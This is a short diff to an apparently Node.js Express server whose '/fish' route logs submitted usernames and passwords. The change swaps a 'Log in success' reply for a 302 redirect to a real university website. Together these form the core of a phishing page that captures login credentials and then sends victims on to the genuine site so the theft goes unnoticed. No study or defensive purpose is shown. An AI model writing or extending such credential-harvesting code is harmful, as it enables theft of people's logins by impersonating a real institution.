@@ -33,5 +33,7 @@ app.post('/fish', function(req, res) {
     console.log(req.body);
     console.log(req.body.UserName);
     console.log(req.body.Password);
-    res.send("Log in success");
+    //res.send("Log in success");
+    res.location('http://oia.ncku.edu.tw/bin/home.php');
+    res.send(302);
 });
